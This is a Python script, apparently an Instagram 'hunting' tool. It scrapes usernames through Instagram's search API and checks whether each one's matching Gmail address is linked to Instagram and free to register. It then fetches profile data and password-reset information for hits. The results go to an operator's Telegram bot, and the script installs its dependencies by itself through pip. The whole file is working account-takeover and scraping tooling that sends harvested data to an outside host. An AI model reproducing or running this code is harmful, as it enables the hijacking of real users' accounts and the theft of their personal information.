import os
try:
    from concurrent.futures import ThreadPoolExecutor
    from Topython import *
    import threading, sys, requests, random
    from rich import print as g
    from rich.panel import Panel
except ModuleNotFoundError:
    os.system('pip install --upgrade pip')
    os.system('pip install curl2pyreqs PySocks Topython concurrent.future')
    from Topython import *
    import threading, sys, requests, random
    from rich import print as g
    from rich.panel import Panel
    os.system('clear')

######L7N#####
O = '\x1b[38;5;208m'
R = '\033[1;31;40m'
X = '\033[1;33;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
K = '\033[1;35;40m'
######L7N#####

class InstagramChecker:
    def __init__(self):
        self.token = input(O + "TOKEN : ")
        self.id_tele = input(O + "ID : ")
        os.system('clear')

        self.good_IG = 0
        self.bad_IG = 0
        self.good_email = 0
        self.bad_email = 0

    def check_insta(self, email):
        response = Instagram.CheckEmail(email + "@gmail.com")
        if response:
            self.good_IG += 1
            self.check_email(email)
        else:
            self.bad_IG += 1
        self.Sys()

    def check_email(self, email):
        try:
            response = Email.gmail(email)
            if response:
                self.good_email += 1
                self.info_insta(email)
            else:
                self.bad_email += 1
        except Exception as e:
            self.check_email(email)
        self.Sys()

    def reset(self, user):
        return Instagram.Rests(user)

    def info_insta(self, user):
        info = Instagram.information(user)
        nnn = random.choice([R, X, F, B, K, O])
        name, username, followers, following, date, Id, post, bio = (
        info['name'], info['username'], info['followers'],
         info['following'], info['date'], info['id'],
         info['post'], info['bio']
        )
        send = (
            f"Name : {name}\nUsername : {username}\nEmail : {username}@gmail.com\n"
            f"Followers : {followers}\nFollowing : {following}\nDate : {date}\nid : {Id}\n"
            f"Posts : {post}\nBio : {bio}\nReset : {self.reset(user)}\nBY : @g_4_q  -  @ToPython !"
        )
        requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id_tele}&text={send}")
        print(nnn)
        Hit = Panel(send)
        g(Panel(Hit, title=f"Instagram | {self.good_IG}"))

    def users(self):
        letters = [
"一右雨円王音下火花学気九休金空月見五口校左三山子四時出女小上森人水正生青夕石先早草足村大男中虫町天田土二日入年白八百文木本名目立力林六",
"アィイゥウェエォオカガキギクグケゲコゴサザシジスズセゼソゾタダチヂッツヅテデトドナニヌネノハバパヒビピフブプヘベペホボポマミムメモャヤュユョヨラリルレロヮワヰヱヲンヴヵヶ",
"あぃいぅうぇえぉおかがきぎくぐけげこごさざしじすずせぜそぞただちぢっつづてでとどなにぬねのはばぱひびぴふぶぷへべぺほぼぽまみむめもゃやゅゆょよらりるれろゎわゐゑをん",
"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
"абвгдеёжзийклмнопрстуфхцчшщъыьэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ",
        "پچژکگابتثجحخدذرزسشصضطظعغفقكلمنهوي",
        ]

        with ThreadPoolExecutor(max_workers=3) as executor:
            while True:
                name = random.choice(letters)            
                keyword = ''.join(random.choice(name) for _ in range(random.randint(4,7)))
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
                    'x-fb-friendly-name': 'PolarisSearchBoxRefetchableDirectQuery',
                }
                data = {
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisSearchBoxRefetchableDirectQuery',
                    'variables': '{"data":{"context":"blended","include_reel":"true","query":"'+str(keyword)+'","rank_token":"","search_surface":"web_top_search"},"hasQuery":true}',
                    'server_timestamps': 'true',
                    'doc_id': '7778489908879212',
                }
                response = requests.post('https://www.instagram.com/graphql/query', cookies=None, headers=headers, data=data).json()['data']['xdt_api__v1__fbsearch__topsearch_connection']['users']
                
                for user in response:
                    email = user['user']['username']
                    if "_" not in email and len(email) > 5:
                        executor.submit(self.check_insta, email=email)

    def Sys(self):
        sys.stdout.write(f"\r   {C}Hunt : {F}{self.good_email}   {C}Bad IG : {R}{self.bad_IG}   {C}Good IG : {X}{self.good_IG}   {C}Bad Gm : {R}{self.bad_email}  \r")
        sys.stdout.flush()

if __name__ == "__main__":
    checker = InstagramChecker()
    checker.users()